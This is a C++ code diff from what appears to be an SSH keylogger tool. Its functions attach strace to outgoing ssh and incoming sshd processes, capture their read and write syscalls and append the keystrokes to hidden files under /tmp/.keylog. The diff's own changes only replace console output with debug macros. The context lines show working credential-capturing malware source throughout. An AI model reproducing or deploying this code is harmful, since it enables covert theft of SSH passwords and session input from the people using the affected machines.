@@ -19,25 +19,24 @@ namespace strace_ns{
             data_from_strace.find("= 1\n") != std::string::npos)
         {
             symbol = parsing_utils::parse_strace_line(data_from_strace, xRegEx);
-//            std::cout << "SYMBOL: " << symbol << std::endl;
         }
         return symbol;
     }
 
     void ssh_keylogger(const uint16_t& pid){
-        std::cout << "Handling process(outgoing SSH) " << pid << std::endl;
+        DEBUG_STDOUT("Handling process(outgoing SSH) " + std::to_string(pid));
         std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e read 2>&1";
         FILE* pipe = popen(strace_cmd.c_str(), "r");
         if (!pipe)
         {
-            std::cout << "Couldn't 'strace' command" << std::endl;
+            DEBUG_STDERR("Couldn't 'strace' command");
             return;
         }
         fs::path log_filename = "/tmp/.keylog";
         log_filename /= std::to_string(pid) + "_ssh.log";
         FILE *fd = std::fopen(log_filename.c_str(), "a+");
         if(!fd){
-            std::cout << "Log-file error: " << log_filename << std::endl;
+            DEBUG_STDERR("Log-file error: " + log_filename.string());
             return;
         }
         std::array<char, 256> buffer{};
@@ -48,7 +47,7 @@ namespace strace_ns{
             if(!symbol.empty())
                 std::fwrite(symbol.data(), 1, symbol.size(), fd);
         }
-        std::cout << "Connection is closed from PID = " << pid << std::endl;
+        DEBUG_STDOUT("Connection is closed from PID = " +  std::to_string(pid));
         HandledProcesses& current_proc_list = HandledProcesses::getInstance();
         current_proc_list.del_from_proc_list(pid);
         pclose(pipe);
@@ -56,19 +55,19 @@ namespace strace_ns{
     }
 
     void sshd_keylogger(const uint16_t& pid){
-        std::cout << "Handling process(incoming SSH) " << pid << std::endl;
+        DEBUG_STDOUT("Handling process(incoming SSH) " + std::to_string(pid));
         std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e write 2>&1";
         FILE* pipe = popen(strace_cmd.c_str(), "r");
         if (!pipe)
         {
-            std::cout << "Couldn't 'strace' command" << std::endl;
+            DEBUG_STDERR("Couldn't 'strace' command");
             return;
         }
         fs::path log_filename = "/tmp/.keylog";
         log_filename /= std::to_string(pid) + "_sshd.log";
         FILE *fd = std::fopen(log_filename.c_str(), "a+");
         if(!fd){
-            std::cout << "Log-file error: " << log_filename << std::endl;
+            DEBUG_STDERR("Log-file error: " + log_filename.string());
             return;
         }
         std::array<char, 256> buffer{};
@@ -79,7 +78,7 @@ namespace strace_ns{
             if(!symbol.empty())
                 std::fwrite(symbol.data(), 1, symbol.size(), fd);
         }
-        std::cout << "Connection is closed from PID = " << pid << std::endl;
+        DEBUG_STDOUT("Connection is closed from PID = " +  std::to_string(pid));
         HandledProcesses& current_proc_list = HandledProcesses::getInstance();
         current_proc_list.del_from_proc_list(pid);
         pclose(pipe);
